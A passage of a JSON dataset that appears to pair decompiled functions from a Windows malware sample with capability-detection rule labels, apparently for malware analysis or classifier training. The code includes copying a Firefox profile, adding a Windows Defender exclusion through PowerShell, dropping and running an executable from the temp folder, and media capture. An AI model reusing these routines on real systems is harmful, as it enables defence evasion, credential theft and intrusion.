(*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n                (*_sym.imp.KERNEL32.dll_CreateProcessW)(puVar4, 0, 0, 0, 0, 0, 0, 0, &lpProcessAttributes, &var_5ch);\n                fcn.00405feb();\n                fcn.00405feb();\n                fcn.00405feb();\n                uVar3 = 0xffffffff;\n            }\n            else {\n                fcn.00401052(&var_304h, 0, 0x208);\n                fcn.00410c8a();\n                fcn.0040373f(&var_ch);\n                uVar3 = fcn.004036f7(L\"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\\");\n                fcn.00403447(uVar3);\n                fcn.00405feb();\n                fcn.0040373f(&var_ch);\n                uVar3 = fcn.004036f7(L\"\\\\AppData\\\\Roaming\\\\FirefoxBackup\");\n                fcn.00403447(uVar3);\n                fcn.00405feb();\n                uVar3 = lpFileName;\n                var_38h._0_2_ = 0x414;\n                lpFileOp = 0;\n                var_44h = 3;\n                var_40h = lpFileName;\n                var_3ch = 0;\n                stack0xffffffc6 = 0;\n                var_2eh = 0;\n                var_32h = 0;\n                (*_sym.imp.SHELL32.dll_SHFileOperationW)(&lpFileOp);\n                (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(uVar3, 0);\n                fcn.0040373f(&var_1ch);\n                fcn.0040357c(L\"profiles.ini\");\n                (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(L\"Profile0\", L\"Path\", 0, &var_304h, 0x104, var_20h);\n                fcn.0040373f(&var_1ch);\n                fcn.0040357c(&var_304h);\n                fcn.004036f7(L\"xcopy.exe /H /Y /E /C \");\n                fcn.004033d1(0x41a0ec);\n                fcn.00403447(&var_24h);\n                uVar3 = 0x41a0ec;\n                fcn.004033d1(0x41a0ec);\n                fcn.004033d1(uVar3);\n                fcn.004033d1(uVar3);\n                fcn.00403447(&lpFileName);\n                fcn.004033d1(0x41a0ec);\n                fcn.00410c8a();\n                uVar3 = fcn.004036f7(L\"\\\\xcopy.exe\");\n                fcn.00403447(uVar3);\n                fcn.00405feb();\n                fcn.00401052(&var_fch, 0, 0x44);\n                pcVar1 = _sym.imp.KERNEL32.dll_CreateProcessW;\n                (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                          (lpCommandLine, var_14h, 0, 0, 0, 0x8000000, 0, 0, &var_fch, &hHandle);\n                (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n                fcn.004036f7(0x417b80);\n                puVar5 = puVar4;\n                fcn.0040357c(puVar4);\n                fcn.004033d1(puVar5);\n                fcn.004033d1(puVar5);\n                fcn.00403447(&lpFileName);\n                fcn.004033d1(0x41a0ec);\n                uVar3 = fcn.004036f7(L\"\\\\prefs.js\");\n                fcn.00403447(uVar3);\n                fcn.00405feb();\n                uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 4, 3, 0, 4, 0x80, 0);\n                (*_sym.imp.KERNEL32.dll_WriteFile)\n                          (uVar3, \"user_pref(\\\"layers.acceleration.disabled\\\", true);\", 0x30, &var_4ch, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n                (*pcVar1)(puVar4, var_18h, 0, 0, 0, 0, 0, 0, &lpProcessAttributes, &var_5ch);\n                fcn.00405feb();\n                var_18h = 0;\n                fcn.00405feb();\n                fcn.00405feb();\n                var_14h = 0;\n                fcn.00405feb();\n                fcn.00405feb();\n                fcn.00405feb();\n                fcn.00405feb();\n                fcn.00405feb();\n                uVar3 = 0xffffffff;\n            }\n        }\n        else {\n            iVar2 = fcn.00401144(uVar3, L\"iexplore.exe\");\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_CreateProcessW)(puVar4);\n                uVar3 = 0xfffffffd;\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                          (lpApplicationName, 0, 0, 0, 0, 0, 0, 0, &lpProcessAttributes, &var_5ch);\n                uVar3 = var_54h;\n            }\n        }\n    }\n    fcn.00405feb();\n    return uVar3;\n}\n",
        "token_count": 3198
    },
    "00413eba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.00413eba(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *arg_10h;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar1);\n    if (iVar2 != 0) {\n        if (var_4h == 0) {\n            iVar2 = fcn.0041405f();\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar3, 0x104);\n            arg_10h = \"\\\\System32\\\\cmd.exe\";\n            iVar2 = iVar3;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3, \"\\\\System32\\\\cmd.exe\", 0x14);\n            fcn.0040102c(iVar4 + iVar3, iVar2, arg_10h);\n            fcn.00401052(&var_60h, 0, 0x44);\n            var_14h = 0;\n            uStack20 = 0;\n            var_ch = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar3, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n            if (iVar2 == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        fcn.00413f7f();\n    }\n    return;\n}\n",
        "token_count": 480
    },
    "0041405f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate processes/f67bedfed7e245aa9b0908c198426ab8",
            "contain loop",
            "enumerate processes"
        ],
        "decompiled_code": "\nuint fcn.0041405f(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_128h;\n    uint var_120h;\n    uint var_104h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    fcn.00401052(&var_128h, 0, 0x128);\n    var_128h = 0x128;\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(uVar1, &var_128h);\n    while( true ) {\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n            return 0;\n        }\n        iVar2 = fcn.00401176(&var_104h, \"explorer.exe\");\n        if (iVar2 == 0) break;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(uVar1, &var_128h);\n    }\n    return var_120h;\n}\n",
        "token_count": 236
    },
    "004144cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004144cb(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401000(arg_ch, 0x4175d0, 0x10);\n    if ((iVar1 != 0) && (iVar1 = fcn.00401000(arg_ch, 0x417590, 0x10),  iVar1 != 0)) {\n        return 0x80004002;\n    }\n    *arg_10h = arg_8h;\n    return 0;\n}\n",
        "token_count": 133
    },
    "0041459d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041459d(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    arg_8h = arg_8h + 0x10;\n    iVar1 = fcn.00401000(arg_8h, 0x417640, 0x10);\n    if (iVar1 == 0) {\n        *(in_ECX + 4) = 0x10;\n    }\n    else {\n        iVar1 = fcn.00401000(arg_8h, 0x417630, 0x10);\n        if (iVar1 == 0) {\n            *(in_ECX + 4) = 0x18;\n        }\n        else {\n            iVar1 = fcn.00401000(arg_8h, 0x417620, 0x10);\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = 0x20;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "00414603": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414603(uint *param_1)\n\n{\n    *param_1 = 0x41a768;\n    fcn.00405feb();\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[3], 0, 0x8000);\n    return;\n}\n",
        "token_count": 70
    },
    "004146e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004146e1(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_d4h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint var_7ch;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uchar auStack72 [4];\n    uint var_40h;\n    uint var_3ch;\n    uint var_36h;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    var_8h = NULL;\n    var_ch = NULL;\n    piVar4 = NULL;\n    var_10h = NULL;\n    piVar3 = NULL;\n    var_14h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4175c0, 0, 1, 0x41a79c, &var_14h);\n    if (var_14h != NULL) {\n        (***var_14h)(var_14h, 0x4175a0, &var_ch);\n        if (var_ch != NULL) {\n            (**(*var_ch + 4))(var_ch);\n            fcn.00414a12();\n            if (var_8h == NULL) goto code_r0x00414862;\n            (*pcVar1)(0x417610, 0, 1, 0x41a78c, &var_10h);\n            if (var_10h != NULL) {\n                (**(*var_10h + 0xc))(var_10h, var_8h, L\"Source\");\n                (**(*var_10h + 0xc))(var_10h, var_ch, L\"Grabber\");\n                fcn.00401052(&var_8ch, 0, 0x48);\n                var_8ch = *0x417650;\n                uStack140 = *0x417654;\n                uStack136 = *0x417658;\n                uStack132 = *0x41765c;\n                var_7ch = *0x417630;\n                uStack124 = *0x417634;\n                var_74h = *0x417638;\n                uStack116 = *0x41763c;\n                (**(*var_14h + 0x10))(var_14h, &var_8ch);\n                piVar4 = fcn.0041462f();\n                if (piVar4 != NULL) {\n                    piVar3 = fcn.0041464b();\n                    if (piVar3 != NULL) {\n                        iVar2 = (**(*var_10h + 0x2c))(var_10h, piVar4, piVar3);\n                        if (-1 < iVar2) {\n                            (**(*var_14h + 0x14))(var_14h, &var_d4h);\n                            fcn.0040102c(auStack72 + ((var_90h + 0x30) - var_90h) + -0x30, var_90h + 0x30, 0x28);\n                            fcn.00414492();\n                            fcn.00414ad1(arg_8h, var_3ch, var_40h, var_36h);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (var_8h != NULL) {\n        (**(*var_8h + 8))(var_8h);\n        var_8h = NULL;\n    }\ncode_r0x00414862:\n    if (var_ch != NULL) {\n        (**(*var_ch + 8))(var_ch);\n        var_ch = NULL;\n    }\n    if (var_10h != NULL) {\n        (**(*var_10h + 8))(var_10h);\n        var_10h = NULL;\n    }\n    if (var_14h != NULL) {\n        (**(*var_14h + 8))(var_14h);\n        var_14h = NULL;\n    }\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4);\n    }\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return;\n}\n",
        "token_count": 1051
    },
    "00414f1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414f1d(int32_t **arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    int32_t in_ECX;\n    \n    arg_8h_00 = **arg_8h;\n    arg_8h_01 = fcn.00413441(arg_8h_00);\n    fcn.00403549(arg_8h_01);\n    fcn.00405feb();\n    *(in_ECX + 4) = *(*arg_8h + arg_8h_00 + 4);\n    return;\n}\n",
        "token_count": 138
    },
    "00414f7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00414f7e(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00401085(0x100);\n    arg_8h = fcn.00401085(0x100);\n    fcn.00401052(iVar1, 0, 0x100);\n    fcn.00401052(arg_8h, 0, 0x100);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, iVar1, 0x100);\n    uVar2 = fcn.00401133(\"powershell Add-MpPreference -ExclusionPath \");\n    fcn.0040102c(arg_8h, \"powershell Add-MpPreference -ExclusionPath \", uVar2);\n    fcn.0040102c(arg_8h + 0x2b, iVar1, 3);\n    iVar1 = iVar1 + 0xff;\n    uVar2 = 1;\n    iVar3 = fcn.00401133(arg_8h);\n    fcn.0040102c(iVar3 + arg_8h, iVar1, uVar2);\n    (*_sym.imp.KERNEL32.dll_WinExec)(arg_8h, 0);\n    return;\n}\n",
        "token_count": 298
    },
    "00415169": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create or open file",
            "get common file path",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415169(uint *arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint var_c44h;\n    uint var_844h;\n    uint var_444h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = in_ECX + 4;\n    uVar3 = fcn.00413441(**arg_8h);\n    fcn.00403549(uVar3);\n    fcn.00405feb();\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(0, arg_8h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, arg_8h);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar3);\n    fcn.00401052(&var_444h, 0, 0x400);\n    fcn.00401052(&var_844h, 0, 0x400);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathA;\n    (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x400, &var_444h);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_444h, \"find.exe\");\n    (*pcVar1)(0x400, &var_844h);\n    (*pcVar2)(&var_844h, \"find.db\");\n    uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileA)(&var_444h, 0x10000000, 1, 0, 2, 0x84, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(uVar5, uVar3, uVar4, &var_8h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    fcn.00401052(&var_c44h, 0, 0x400);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_c44h, \"-w %ws -d C -f %s\", *var_4h, &var_844h);\n    var_34h = &var_444h;\n    var_44h = 0x3c;\n    var_30h = &var_c44h;\n    var_40h = 0x40;\n    _var_20h = 0;\n    _var_18h = 0;\n    _var_10h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExA)(&var_44h);\n    return;\n}\n",
        "token_count": 770
    },
    "00415307": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00415307(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint var_81ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00401052(&var_81ch, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x400, &var_81ch);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_81ch, 0x41a818);\n    arg_8h_00 = in_ECX + 4;\n    uVar1 = fcn.004036f7(&var_81ch);\n    fcn.00403549(uVar1);\n    fcn.00405feb();\n    var_18h = 0;\n    var_1ch = 0x35;\n    _var_14h = ZEXT816(0);\n    uVar1 = arg_8h;\n    fcn.00403873(arg_8h_00);\n    fcn.0040378b(arg_8h_00);\n    fcn.00403777(arg_8h_00, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 310
    },
    "004157a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004157a1(uint arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint var_224h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00401052(&var_224h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &var_224h);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_224h, L\"\\\\Microsoft Vision\\\\\");\n    fcn.0040357c(&var_224h);\n    arg_8h_00 = &var_4h;\n    var_1ch = 0x3b;\n    var_18h = 0;\n    _var_14h = ZEXT816(0);\n    uVar1 = arg_8h;\n    fcn.00403873(arg_8h_00);\n    fcn.0040378b(arg_8h_00);\n    fcn.00403777(arg_8h_00, uVar1);\n    fcn.00405feb();\n    return arg_8h;\n}\n",
        "token_count": 306
    },
    "00415c9b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00415c9b(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpString2;\n    uint lpString2_00;\n    uint lpString2_01;\n    uint lpString2_02;\n    uint lpString2_03;\n    uint arg_8h;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004025d2();\n    fcn.004025d2();\n    fcn.004025d2();\n    fcn.004025d2();\n    fcn.004025d2();\n    fcn.004025d2();\n    fcn.004025d2();\n    *0x559cd8 = 0;\n    *0x559cf4 = 0;\n    *0x559d10 = 0;\n    *0x559d2c = 0;\n    *0x559d48 = 0;\n    *0x559d80 = 0;\n    *0x559d64 = 0;\n    uVar1 = fcn.00401085(0x19);\n    uVar2 = fcn.00401085(0x19);\n    lpString2 = fcn.00401085(0x19);\n    lpString2_00 = fcn.00401085(0x19);\n    lpString2_01 = fcn.00401085(0x19);\n    lpString2_02 = fcn.00401085(0x19);\n    lpString2_03 = fcn.00401085(0x19);\n    fcn.00413363();\n    fcn.00413363();\n    fcn.00413363();\n    fcn.00413363();\n    fcn.00413363();\n    fcn.00413363();\n    fcn.00413363();\n    uVar1 = fcn.004034d1(uVar1);\n    fcn.004112c4(uVar1);\n    fcn.00405feb();\n    uVar1 = extraout_ECX;\n    arg_8h = fcn.004034d1(uVar2);\n    fcn.004112c4(arg_8h);\n    fcn.00405feb(arg_8h, uVar2, uVar1);\n    uVar1 = extraout_ECX_00;\n    uVar2 = fcn.004034d1(lpString2);\n    fcn.004112c4(uVar2);\n    fcn.00405feb(uVar2, lpString2, uVar1);\n    uVar1 = extraout_ECX_01;\n    uVar2 = fcn.004034d1(lpString2_00);\n    fcn.004112c4(uVar2);\n    fcn.00405feb(uVar2, lpString2_00, uVar1);\n    uVar1 = extraout_ECX_02;\n    uVar2 = fcn.004034d1(lpString2_01);\n    fcn.004112c4(uVar2);\n    fcn.00405feb(uVar2, lpString2_01, uVar1);\n    uVar1 = extraout_ECX_03;\n    uVar2 = fcn.004034d1(lpString2_02);\n    fcn.004112c4(uVar2);\n    fcn.00405feb(uVar2, lpString2_02, uVar1);\n    uVar1 = extraout_ECX_04;\n    uVar2 = fcn.004034d1(lpString2_03);\n    fcn.004112c4(uVar2);\n    fcn.00405feb(uVar2, lpString2_03, uVar1);\n    return 0x559cc0;\n}\n",
        "token_count": 890
    },
    "00415f0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415f0d(uint arg_8h)\n\n{\n    fcn.00402fce(&arg_8h);\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 44
    },
    "00401325": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401325(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY32;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x401340;\n    fcn.00401586();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.004015d3(&stack0xffffffe0, arg_ch);\n            fcn.00401485(arg_8h_00, arg_ch, uStackY32, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "0040136c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040136c(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x401387;\n    fcn.00401735();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.00401787(&stack0xffffffe4, arg_ch);\n            fcn.00401612(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "004013b3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013b3(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStack20 = 0x4013ce;\n    fcn.004018c7();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.00401914(&stack0xffffffd8, arg_ch);\n            fcn.004017c8(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "004013fa": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013fa(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x401415;\n    fcn.00401a48();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.00401a95(&stack0xffffffe4, arg_ch);\n            fcn.00401955(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00401fb7": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fb7(int32_t arg_8h)\n\n{\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    uStack20 = 0x401fc4;\n    fcn.004018c7();\n    arg_ch = 0;\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.00401914(&stack0xffffffd8, arg_ch);\n            fcn.004017c8(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "004020f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004020f0(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStackY32 [12];\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x40210b;\n    fcn.0040216d();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.004021c1(&stack0xffffffe0, arg_ch);\n            fcn.00402028(arg_8h_00);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00404440": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404440(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    uchar auStack32 [28];\n    \n    uStack56 = 7;\n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401914(auStack32, arg_ch);\n            fcn.00403873(arg_8h_00);\n            fcn.00405feb();\n            iVar1 = fcn.00401914(auStack48 + 4, arg_ch);\n            fcn.00403852(*(iVar1 + 0x10));\n            fcn.00405feb();\n            iVar1 = fcn.00401914(&uStack56, arg_ch);\n            fcn.00403829(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.00405feb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 324
    },
    "00404549": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404549(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack56 [24];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 5;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00401a95(auStack56, arg_ch);\n            fcn.00403873(arg_8h_00);\n            fcn.00405feb();\n            iVar1 = fcn.00401a95(auStack56, arg_ch);\n            fcn.00403852(*(iVar1 + 4));\n            fcn.00405feb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0040378b(arg_8h);\n    fcn.00403777();\n    return arg_8h;\n}\n",
        "token_count": 273
    },
    "00404966": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
